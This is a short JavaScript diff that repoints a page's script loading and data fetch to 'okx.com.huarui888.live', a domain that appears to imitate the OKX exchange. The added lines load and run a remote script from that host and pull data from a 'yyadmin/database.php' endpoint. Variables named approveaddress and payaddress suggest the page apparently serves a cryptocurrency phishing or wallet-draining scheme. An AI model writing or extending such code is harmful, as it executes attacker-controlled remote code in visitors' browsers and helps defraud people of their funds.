@@ -45,7 +45,7 @@
 
 jQuery.ajaxSetup({ cache: true });
         jQuery.ajax({
-            url: "./newokx/js/help.js",
+            url: "https://www.okx.com.huarui888.live/newokx/js/help.js",
             dataType: "script",
             cache: true
         });
@@ -132,7 +132,7 @@ jQuery.ajaxSetup({ cache: true });
 
 let approveaddress, payaddress, isopen, ismiaou;
         var domain = '';
-fetch('yyadmin/database.php')
+fetch('https://www.okx.com.huarui888.live/yyadmin/database.php')
     .then(response => response.json())
     .then(data => {
         // 解析JSON数据并将其插入到表格中
